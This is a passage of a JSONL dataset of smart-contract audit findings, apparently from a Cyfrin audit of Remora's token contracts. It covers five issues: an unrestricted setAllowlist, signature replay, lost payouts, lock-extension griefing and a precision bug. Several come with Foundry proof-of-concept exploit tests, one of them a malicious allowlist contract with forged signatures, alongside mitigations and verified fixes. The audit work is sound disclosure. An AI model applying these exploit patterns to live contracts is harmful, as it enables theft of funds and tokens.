{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-001", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 1, "page_start": null, "title": "`SignatureValidator::setAllowlist` is unrestricted leading to free purchases of tokens", "short_summary": null, "description_md": null, "full_markdown": "### `SignatureValidator::setAllowlist` is unrestricted leading to free purchases of tokens\n\n**Description:** `SignatureValidator::setAllowlist` is unrestricted.\n\nSince `SignatureValidator` inherited by `ReferralManager` and `TokenBank` this has downstream consequences.\n\nFor `TokenBank` in particular this means that\n- attacker can call `TokenBank::setAllowlist(maliciousAllowList)` where `maliciousAllowList::isSigner`  just returns `true` for the attacker\n- They can then spoof a signature by a Remora admin\n- call `TokenBank::buyTokenOCP` using the spoofed signature\n- `buyTokenOCP` indirectly calls `_buyToken` with `useStableCoin == false`\n- thus the entire code path guarded by `if (useStablecoin) {` is skipped and no stablecoins are transferred from the attacker\n\nThe same vulnerability could be used to steal all of `ReferralManager`'s bonuses.\n\n**Impact:** Attacker can\n- purchase all remaining central tokens for free\n- steal from `ReferralManager` bonuses\n\n**Proof of Concept:** The PoC below  demonstrates the buying of central tokens for free.\n\nAdd `MaliciousAllowlist.sol`\n```solidity\ncontract MaliciousAllowlist {\n\n    address maliciousSigner;\n\n    constructor(address _maliciousSigner) {\n        maliciousSigner = _maliciousSigner;\n    }\n\n    function isSigner(address signer) public view returns (bool) {\n        return (signer == maliciousSigner);\n    }\n\n}\n```\n\nAnd then add this test to `TokenBankTest.t.sol` (after adding import of `MaliciousSigner`)\n\n```solidity\n    function test_cyfrin_buyTokenOCP_for_free() public {\n        uint64 TOTAL_TOKENS = 10_000;\n        _addCentralToTokenBank(60e6, true, 50_000);\n\n        centralTokenProxy.mint(address(tokenBankProxy), uint64(TOTAL_TOKENS));\n        address attacker = getDomesticUser(2);\n\n        (address attackerSigner, uint256 sk) = makeAddrAndKey(\"BUY_SIGNER\");\n\n\n        /*\n         * Attacker sets a malicious Allowlist and signs the buy instead of a Remora Admin\n         */\n        vm.startPrank(attackerSigner);\n        MaliciousAllowlist maliciousAllowlist = new MaliciousAllowlist(attackerSigner);\n        tokenBankProxy.setAllowlist(address(maliciousAllowlist));\n        bytes32 typeHash = keccak256(\"BuyToken(address investor, address token, uint256 amount)\");\n        bytes32 structHash = keccak256(abi.encode(typeHash, attacker, address(centralTokenProxy), uint256(TOTAL_TOKENS)));\n        bytes32 digest = MessageHashUtils.toTypedDataHash(tokenBankProxy.getDomainSeparator(), structHash);\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(sk, digest);\n        bytes memory sig = abi.encodePacked(r, s, v);\n        vm.stopPrank();\n\n        /*\n         * Now attacker buys all the tokens using the signature they created\n         */\n        vm.prank(attacker);\n        tokenBankProxy.buyTokenOCP(attackerSigner, address(centralTokenProxy), TOTAL_TOKENS, sig);\n        // attacker receives domestic child tokens\n        assertEq(d_childTokenProxy.balanceOf(attacker), TOTAL_TOKENS);\n    }\n```\n\n**Recommended Mitigation:** Since `SignatureValidator` is an abstract contract, `setAllowlist` should be an internal function.\n\n```diff\n-    function setAllowlist(address allowlist) external {\n+    function _setAllowlist(address allowlist) internal {\n        if (allowlist == address(0)) revert InvalidAddress();\n        SVStorage storage $ = _getSVStorageStorage();\n        if ($._allowlist != allowlist) {\n            $._allowlist = allowlist;\n            emit AllowlistSet(allowlist);\n        }\n    }\n```\n\n`TokenBank` should then expose `setAllowlist` as an external function with the `restricted` modifier\n\n```diff\n+   function setAllowlist(address signer) external restricted {\n+       super._setAllowlist(signer);\n+   }\n```\n\n**Remora:** Fixed at commit [cc447da](https://github.com/remora-projects/remora-dynamic-tokens/commit/cc447da9fca1a997ffbb34f4d099be8f7dce7133)\n\n**Cyfrin:** Verified. `setAllowlist()` is now restricted.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-002", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 2, "page_start": null, "title": "Signatures on `TokenBank` and `AllowList` can be reused in perpetuity an infinite amount of times", "short_summary": null, "description_md": null, "full_markdown": "### Signatures on `TokenBank` and `AllowList` can be reused in perpetuity an infinite amount of times\n\n**Description:** `TokenBank` allows buyers to purchase tokens by getting an off-chain signature, which specifies the token and the amount they are allowed to buy. When buying using a signature, the buyer doesn't have to pay on-chain for the purchase (As that is handled off-chain). The problem is that the `hash` of the signature doesn't include a `nonce` to prevent the same signature from being reused to process multiple purchases.\n- The `hash` only includes the `investor`, `token`, and `amount`, which leads to the contract not being able to determine if a signature has already been used or not.\n```solidity\n//TokenBank.sol//\n    // Handle payment off chain, including referral discount\n    function buyTokenOCP(\n        address signer,\n        address tokenAddress,\n        uint256 amount,\n        bytes memory signature\n    ) external nonReentrant {\n        ...\n        if (!verifySignature(signer, sender, tokenAddress, amount, signature))\n            revert InvalidSignature();\n        //@audit => No payment of stablecoin!\n        _buyToken(address(0), sender, tokenAddress, amount, false);\n    }\n\n    function verifySignature(\n        address signer,\n        address investor,\n        address token,\n        uint256 amount,\n        bytes memory signature\n    ) internal view returns (bool result) {\n//@audit-issue => No nonce on the hash of the signature\n@>      bytes32 structHash = keccak256(\n            abi.encode(\n                BUY_TOKEN_TYPEHASH,\n                investor,\n                token,\n                amount\n        ));\n\n        result = _verifySignature(signer, _hashTypedDataV4(structHash), signature);\n    }\n\n```\n\nThis same problem is present in the `AllowList` contract, which allows users to reuse signatures to regain their permissions if they are removed.\n\n**Impact:** On `TokenBank`:\n- Buyers can reuse signatures to purchase infinite tokens by paying the cost to obtain a single signature\n\nOn `AllowList`:\n- user replays selfAllowUser signature to add themselves to the allow list again.\n- A malicious admin who was removed as an admin can replay a signature after he was removed to re-enable themselves.\n\n**Proof of Concept:** Add the next PoC to `TokenBankTest.t.sol`:\n```solidity\n    function test_cyfrin_buyTokenOCP_offchain_ReUseSignature() public {\n        uint256 TOKENS_TO_PURCHASE = 1;\n        _addCentralToTokenBank(60e6, true, 50_000);\n        // seed inventory\n        centralTokenProxy.mint(address(tokenBankProxy), uint64(5));\n        address to = getDomesticUser(2);\n        // register authorized signer in allowlist\n        (address signer, uint256 sk) = makeAddrAndKey(\"BUY_SIGNER\");\n        bytes4[] memory asel = new bytes4[](1);\n        asel[0] = bytes4(keccak256(\"addAuthorizedSigner(address)\"));\n        accessMgrProxy.setTargetFunctionRole(address(allowListProxy), asel, ADMIN_TOKEN_ID);\n        accessMgrProxy.grantRole(ADMIN_TOKEN_ID, address(this), 0);\n        allowListProxy.addAuthorizedSigner(signer);\n        // build EIP-712 signature for BuyToken(investor, token, amount)\n        bytes32 typeHash = keccak256(\"BuyToken(address investor, address token, uint256 amount)\");\n        bytes32 structHash = keccak256(abi.encode(typeHash, to, address(centralTokenProxy), TOKENS_TO_PURCHASE));\n        bytes32 digest = MessageHashUtils.toTypedDataHash(tokenBankProxy.getDomainSeparator(), structHash);\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(sk, digest);\n        bytes memory sig = abi.encodePacked(r, s, v);\n        vm.startPrank(to);\n        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);\n        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);\n        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);\n        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);\n        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);\n        // to receives domestic child tokens\n        assertEq(d_childTokenProxy.balanceOf(to), 5);\n        vm.stopPrank();\n    }\n\n```\n\n**Recommended Mitigation:** Consider adding a `nonce` to the hash that is signed. Refer to these articles to get more familiar with signature replay attacks\n- [Mitigate Against Nonce Replay Attacks](https://www.remora-projects.io/blog/replay-attack-in-ethereum#mitigating-against-missing-nonce-replay-attacks)\n- [Signature Replay Attacks](https://dacian.me/signature-replay-attacks#heading-missing-nonce-replay)\n\n**Remora:** Fixed at commit [4f73c1d](https://github.com/remora-projects/remora-dynamic-tokens/commit/4f73c1de5e9b0beea6cdc0af3eb43bc4546ea203)\n\n**Cyfrin:** Verified. A nonce has been added to the digestHash that is used to validate the signature.\n\n\\clearpage\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-003", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 3, "page_start": null, "title": "Pending payouts when resolving an investor are lost because there is no mechanism to claim the resolved payment", "short_summary": null, "description_md": null, "full_markdown": "### Pending payouts when resolving an investor are lost because there is no mechanism to claim the resolved payment\n\n**Description:** When resolving a user who loses access to their account, the `ChildToken::resolveUser` function migrates balances, locks, and frozen tokens to a new address, ensuring the investor retains their previous balances. Even the pending payouts are calculated and assigned to the new address with the intention of allowing the investor to claim those pending payouts from the new account.\n\nThe problem is that no function allows an account to claim the calculated `resolvedPay`, which means the pending payouts for the old addresses are indeed migrated to the new addresses; however, the contracts don't offer a mechanism for investors to claim such payouts.\n```solidity\n///DividendManager.sol//\n    function _resolvePay(address oldAddress, address newAddress) internal {\n//@audit-issue => no function allows the `newAddress` to claim the payout of the `oldAddress` saved on the `_resolvedPay` mapping associated to the `newAddress`\n@>      _getHolderManagementStorage()._resolvedPay[newAddress] = SafeCast.toUint128(_claimPayout(oldAddress));\n        emit PaymentResolved(oldAddress, newAddress);\n    }\n```\n\nAdditionally, it is theoretically possible that payouts for an old address are lost if the newAddress is an address with an existing `resolvedPay` balance. The `DividendManager::_resolvePay` function assigns the calculated payout of the old address, regardless of whether the `resolvedPay` mapping has any value in it.\n\n**Impact:** Pending payments for investors who lost access to their accounts and had their balances transferred to a new account via the `ChildToken::resolveUser` are lost.\n\n**Recommended Mitigation:** Consider implementing a function that allows the new addresses to claim the calculated `resolvedPay` of the old addresses.\n\n**Remora:** Fixed at commit [1a69894](https://github.com/remora-projects/remora-dynamic-tokens/commit/1a698942c15a8a0ab7b866bca2a6409bcb221828).\n\n**Cyfrin:** Verified. Payouts of resolved users are claimable by the `newAddress` via the `ChildToken::claimPayout`\n", "severity": "High", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-004", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 4, "page_start": null, "title": "Migrating the existing locks for an investor when is resolved can be gamed causing the existing locks to last longer than they should", "short_summary": null, "description_md": null, "full_markdown": "### Migrating the existing locks for an investor when is resolved can be gamed causing the existing locks to last longer than they should\n\n**Description:** When resolving an investor, the existing locks on the `oldAddress` are migrated to the `newAddress` by appending the locks from the `oldAddress` right at the end of the existing locks on the `newAddress`.\n```solidity\n    function _newAccountSameLocks(address oldAddress, address newAddress) internal {\n        ...\n//@audit => locks from `oldAddress` are appended after the existing locks of the `newAddress`\n        uint16 len = oldData.endInd - oldData.startInd;\n        for (uint16 i = 0; i < len; ++i) {\n@>          newData.tokenLockUp[newData.endInd++] = oldData.tokenLockUp[\n                oldData.startInd + i\n            ];\n        }\n        newData.tokensLocked += oldData.tokensLocked;\n\n        // reset old user data\n        delete $._userData[oldAddress];\n    }\n```\n\nThe algorithm to unlock tokens as the locks surpass the `lockUpTime` and the algorithm to calculate the available tokens both stop iterating over the user's `tokenLockUps` as soon as a lock-up that has not expired is found.\n```solidity\n//LockUpManager.sol//\n\n    function _unlockTokens(\n        address holder,\n        uint256 amount,\n        bool disregardTime // used by admin actions\n    ) internal returns (uint32 amountUnlocked) {\n        ...\n        for (uint16 i = userData.startInd; i < len; ++i) {\n            // if not disregarding time, then check if the lock up time\n            // has been served; if not break out of loop\n//@audit-info => loop exits as soon as a lock that has not reached the lockUpTime is found\n            if (\n                !disregardTime &&\n@>              curTime - userData.tokenLockUp[i].time < lockUpTime\n            ) break;\n\n            // if here means this lockup has been served & can be unlocked\n            uint32 curEntryAmount = userData.tokenLockUp[i].amount;\n\n            ...\n        }\n\nfunction availableTokens(\n    address holder\n) public view returns (uint256 tokens) {\n    ...\n    for (uint16 i = userData.startInd; i < len; ++i) {\n        LockupEntry memory curEntry = userData.tokenLockUp[i];\n        if (curTime - curEntry.time >= lockUpTime) {\n            tokens += curEntry.amount;\n//@audit-info => loop exits as soon as a lock that has not reached the lockUpTime is found\n        } else {\n@>          break;\n        }\n    }\n}\n        ...\n    }\n\n```\n\nThe combination of how the tokens are migrated when resolving an investor and the algorithm's short-circuit as soon as a lock-up that has not expired is found, allows for a griefing attack where the tx to resolve an investor is frontran and 1 ChildToken is donated to the `newAddress`, the `ChildToken::resolveUser` function will migrate tokens to.\n- The donation will create a lock on the `newAddress` for the entire `lockUpDuration`. This lock will be the first lock of the `newAddress`, which means all the existing tokens from the `oldAddress` will be appended **after** that new lock. In other words, all existing locks at the `oldAddress` will remain locked until the new lock reaches the `lockUpDuration`, regardless of whether the `lockUpDuration` for those locks has already been met.\n\n\n**Impact:** Existing lock durations can be gamed, forcing the locks on the newAddress to last longer than they should\n\n**Proof of Concept:** Add the next PoC to `ChildTokenAdminTest.t.sol` test file.\nThe PoC demonstrates:\n1. Resolving users should preserve the existing locks on the `oldUser` (When the attack is not performed)\n2. The migrated tokens on the `newUser` get locked for a longer duration if the attack is performed.\n```solidity\n    function test_GrieffAttacToExtendLocksWhenResolving() public {\n        uint32 DEFAULT_LOCK_TIME = 365 days;\n        uint32 QUART_LOCKTIME = DEFAULT_LOCK_TIME / 4;\n\n        address oldUser = getDomesticUser(1);\n        address newUser = getDomesticUser(2);\n        address extraInvestor = getDomesticUser(3);\n\n        centralTokenProxy.mint(address(this), uint64(2));\n        centralTokenProxy.dynamicTransfer(extraInvestor, 2);\n\n        vm.warp(DEFAULT_LOCK_TIME);\n\n        centralTokenProxy.mint(address(this), uint64(4));\n        centralTokenProxy.dynamicTransfer(oldUser, 1);\n\n        // Distribute payout!\n        IERC20(address(stableCoin)).approve(address(paySettlerProxy), type(uint256).max);\n        paySettlerProxy.distributePayment(address(centralTokenProxy), address(this), 300); // 300 USD(6) total\n\n        vm.warp(block.timestamp + QUART_LOCKTIME);\n        centralTokenProxy.mint(address(this), uint64(1));\n        centralTokenProxy.dynamicTransfer(oldUser, 1);\n\n        vm.warp(block.timestamp + QUART_LOCKTIME);\n        centralTokenProxy.mint(address(this), uint64(1));\n        centralTokenProxy.dynamicTransfer(oldUser, 1);\n\n        vm.warp(block.timestamp + QUART_LOCKTIME);\n        centralTokenProxy.mint(address(this), uint64(1));\n        centralTokenProxy.dynamicTransfer(oldUser, 1);\n\n        uint256 snapshot1 = vm.snapshot();\n            //@audit-info => Validate each 3 months a new token would've been unlocked!\n            for(uint8 i = 1; i == 4; i++) {\n                vm.warp(block.timestamp + (QUART_LOCKTIME * i));\n                assertEq(d_childTokenProxy.availableTokens(oldUser),i);\n            }\n        vm.revertTo(snapshot1);\n\n\n        //@audit-info => Resolving the oldUser without the grieffing attack being executed!\n        d_childTokenProxy.resolveUser(oldUser, newUser);\n\n        //@audit-info => Validate each 3 months a new token would've been unlocked, even after the resolve, locks remains as they are\n        for(uint8 i = 1; i == 4; i++) {\n            vm.warp(block.timestamp + (QUART_LOCKTIME * i));\n            assertEq(d_childTokenProxy.availableTokens(oldUser),i);\n        }\n\n\n        vm.revertTo(snapshot1);\n\n        assertEq(d_childTokenProxy.availableTokens(oldUser),0);\n\n        //@audit => Frontruns resolveUser\n        vm.prank(extraInvestor);\n        d_childTokenProxy.transfer(newUser, 1);\n\n        d_childTokenProxy.resolveUser(oldUser, newUser);\n\n        //@audit-issue => Because of the donation prior to resolveUser() was executed, the locks for the migrated tokens are messed up and all the tokens are extended until the lock of the donated token is over!\n        //@audit-issue => Migrated tokens from oldUser are locked for an entire year\n        vm.warp(block.timestamp + QUART_LOCKTIME);\n        assertEq(d_childTokenProxy.availableTokens(newUser),0);\n\n        vm.warp(block.timestamp + QUART_LOCKTIME);\n        assertEq(d_childTokenProxy.availableTokens(newUser),0);\n\n        vm.warp(block.timestamp + QUART_LOCKTIME);\n        assertEq(d_childTokenProxy.availableTokens(newUser),0);\n\n        //@audit-issue => Only until the donated tokens is unlocked, so are all the migrated tokens\n        vm.warp(block.timestamp + QUART_LOCKTIME);\n        assertEq(d_childTokenProxy.availableTokens(newUser), 5);\n    }\n```\n\n**Recommended Mitigation:** Consider refactoring the logic to migrate the locks from the `oldAddress` to the `newAddress`, so that they are not simply appended to the end of the existing locks. Instead, iterate over the existing locks and compare the `tokenLockup.time` to reorder them so that the times of all the locks are correctly ordered sequentially based on the time. This will allow the existing locks on the `oldAddress` to correctly release the tokens on the `newAddress` as soon as they expire.\n\n**Remora:** Fixed at commit [3d6d874](https://github.com/remora-projects/remora-dynamic-tokens/commit/3d6d87430bbabb16afce37e5cbfe968093fc2d24).\n\n**Cyfrin:** Verified. Refactored `ChildToken::resolveUser` to transfer the signatures from the `oldAddress` to the `newAddress` instead of requiring the `newAddress` to have signed all the documents before resolving the `oldAddress`. This change prevents the `newAddress` from receiving any `ChildToken`, therefore, there won't be any existing locks on the `newAddress`.\n", "severity": "High", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-005", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 5, "page_start": null, "title": "Divide before multiply loses precision in `FiveFiftyRule::_updateEntityAllowance` and leads to caps being exceeded", "short_summary": null, "description_md": null, "full_markdown": "### Divide before multiply loses precision in `FiveFiftyRule::_updateEntityAllowance` and leads to caps being exceeded\n\n**Description:** The function `_updateEntityAllowance` contains\n```solidity\n(REMORA_PERCENT_DENOMINATOR / aData.equity) * amount\n```\n\nThis should be `REMOTE_PERCENT_DENOMINATOR * amount / aData.equity` otherwise precision loss occurs.\n\nSince `_updateEntityAllowance` is used to calculate the amount by which the allowance should be reduced by when `add == false` this issue actually results in a remaining allowance that is too high.\n\n**Impact:** When `add == true` the new allowance will be significantly lower than it should be, which will just be frustrating to investors.\nWhen `add == false` the new allowance can be significantly higher than it should be, which means that investors that individually buy tokens _and_ are part of an entity can exceed their cap.\n\n**Proof of Concept:**\n1. First fix the bug in `canTransfer` because it obscures this bug\n\n```diff\n@@ -505,16 +505,16 @@ contract FiveFiftyRule is UUPSUpgradeable, AccessManagedUpgradeable {\n         // to side changes\n         if (to != address(0)) {\n             IndividualData storage iTo = individualData[to];\n-\n+\n             if (iTo.isEntity) { // if entity\n-                if (entityData[to].allowance <= amount) {\n-                    entityData[to].allowance -= SafeCast.toUint64(amount);\n+                if (entityData[to].allowance >= amount) {\n+                    entityData[to].allowance -= SafeCast.toUint64(amount);\n\n                     iTo.lastBalance += SafeCast.toUint64(amount);\n                     emit FiveFiftyApproved(from, to, amount);\n                     return true;\n                 } else revert ();\n```\n\n2. Now add the file below and run the test. In the console output you will see:\n\n```\n*** INVARIANT VIOLATED ***\n  exposure:   1200001000000\n  cap amount: 1000000000000\n```\n\nThe file's source code is:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.30;\n\nimport \"forge-std/console2.sol\";\nimport {RemoraTestBase} from \"../RemoraTestBase.sol\";\nimport {FiveFiftyRule} from \"../../../contracts/Compliance/FiveFiftyRule.sol\";\nimport {ERC1967Proxy} from \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport {SafeCast} from \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\n\n\ncontract FiveFiftyRule_RoundingPoC is RemoraTestBase {\n    FiveFiftyRule internal fiveFiftyRule;\n\n    // helpers (same as your math discussion)\n    uint256 constant DENOM = 1_000_000;\n\n    function setUp() public override {\n        RemoraTestBase.setUp();\n\n        // Deploy rule and initialize\n        fiveFiftyRule = FiveFiftyRule(address(new ERC1967Proxy(address(new FiveFiftyRule()), \"\")));\n        fiveFiftyRule.initialize(address(accessMgrProxy), 0);\n\n        // Allow our test to call restricted functions on fiveFiftyRule and child\n        bytes4[] memory sel = new bytes4[](1);\n        sel[0] = FiveFiftyRule.addToken.selector;\n        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), sel, ADMIN_TOKEN_ID);\n        accessMgrProxy.grantRole(ADMIN_TOKEN_ID, address(this), 0);\n\n        bytes4[] memory cs = new bytes4[](2);\n        cs[0] = bytes4(keccak256(\"setFiveFiftyCompliance(address)\"));\n        cs[1] = bytes4(keccak256(\"setLockUpTime(uint32)\"));\n        accessMgrProxy.setTargetFunctionRole(address(d_childTokenProxy), cs, ADMIN_TOKEN_ID);\n\n        // Wire fiveFiftyRule to domestic child; remove lockup\n        d_childTokenProxy.setFiveFiftyCompliance(address(fiveFiftyRule));\n        d_childTokenProxy.setLockUpTime(0);\n    }\n\n    function test_RoundingDown_Allows_ExtraEntityToken_ExceedingLookThroughCap() public {\n        // --------------------------\n        // Parameters we use for the PoC\n        // --------------------------\n        // Total supply: large, so we can transfer a very large amount to the catalyst without violating the cap.\n        // We'll target a 50% cap for the catalyst (to leave room for a huge direct transfer).\n        uint64 totalSupply = 10_000_000;\n        uint32 capPercent = 100_000;\n        uint64 capAmountMicros = totalSupply * capPercent;\n\n        uint64 equityMu = 333_334;\n        uint256 ENTITY_BAL = 1_500_000;\n        uint256 CATALYST_BAL = 700_000;\n\n        centralTokenProxy.mint(address(this), totalSupply);\n        fiveFiftyRule.addToken(address(centralTokenProxy));\n\n        // Choose a catalyst (a domestic user) and an entity address\n        address entity = getDomesticUser(0);\n        address catalyst = getDomesticUser(1);\n        address otherInvestor = getDomesticUser(2); // will never directly own any tokens in this example\n        address[] memory investors = new address[](2);\n        investors[0] = catalyst;\n        investors[1] = otherInvestor;\n\n        bytes4[] memory psel = new bytes4[](1);\n        psel[0] = bytes4(keccak256(\"setMaxPercentIndividual(address,uint32)\"));\n        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), psel, ADMIN_TOKEN_ID);\n        fiveFiftyRule.setMaxPercentIndividual(catalyst, capPercent);\n\n\n        bytes4[] memory esel = new bytes4[](2);\n        esel[0] = bytes4(keccak256(\"createEntity(address,address,uint64,uint64,address[])\"));\n        esel[1] = bytes4(keccak256(\"setCatalyst(bool,address,address,uint64,uint64)\"));\n        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), esel, ADMIN_TOKEN_ID);\n\n\n        uint64 calculatedAllowance = SafeCast.toUint64(totalSupply * 1e6 * capPercent / equityMu);\n        console2.log(\"calculatedAllowance: %s\", calculatedAllowance);\n\n        // Check that allowance is correct\n        uint256 userProportion = calculatedAllowance * equityMu / 1e6;\n        assertEq(userProportion, capAmountMicros - 1);\n\n        uint256 exposure = uint256(ENTITY_BAL)* 1e6 * equityMu / 1e6 + CATALYST_BAL * 1e6;\n\n        console2.log(\"\\n\\n*** INVARIANT VIOLATED ***\");\n        console2.log(\"exposure:   %s\", exposure);\n        console2.log(\"cap amount: %s\\n\\n\", capAmountMicros);\n        assertGe(exposure, capAmountMicros);\n\n\n\n        fiveFiftyRule.createEntity(entity, catalyst, equityMu, calculatedAllowance, investors);\n        centralTokenProxy.dynamicTransfer(entity, ENTITY_BAL);\n        logEntity(\"0\", entity);\n        logIndividual(\"entity 0\", entity);\n        logIndividual(\"catalyst 0\", catalyst);\n\n        centralTokenProxy.dynamicTransfer(catalyst, CATALYST_BAL);\n        logEntity(\"1\", entity);\n        logIndividual(\"entity 1\", entity);\n        logIndividual(\"catalyst 1\", catalyst);\n\n    }\n\n    function logEntity(string memory s, address entity) internal view {\n        FiveFiftyRule.EntityData memory ed = fiveFiftyRule.testing_entityData(entity);\n        console2.log(\"---  EntityData %s ---\", s );\n        console2.log(\"catalyst:     %s\", ed.catalyst);\n        console2.log(\"equity:       %s\", ed.equity);\n        console2.log(\"allowance:    %s\", ed.allowance);\n    }\n\n    function logIndividual(string memory s, address individual) internal view {\n        FiveFiftyRule.IndividualData memory id = fiveFiftyRule.testing_individualData(individual);\n        console2.log(\"---  IndividualData %s ---\", s);\n        console2.log(\"isEntity:         %s\", id.isEntity);\n        console2.log(\"numCatalyst:      %s\", id.numCatalyst);\n        console2.log(\"groupId:          %s\", id.groupId);\n        console2.log(\"customMaximum:    %s\", id.customMaximum);\n        console2.log(\"lastBalance:      %s\", id.lastBalance);\n\n    }\n}\n```\n\n**Recommended Mitigation:** Change the order of operators to `REMOTE_PERCENT_DENOMINATOR * amount / aData.equity`\n\n**Remora:** Fixed at commit [de9a89a](https://github.com/remora-projects/remora-dynamic-tokens/commit/de9a89a5eca6a5c9089bc07904662b8a64556dea)\n\n**Cyfrin:** Verified. Update order of operations, now, first multiply then divide.\n", "severity": "High", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": 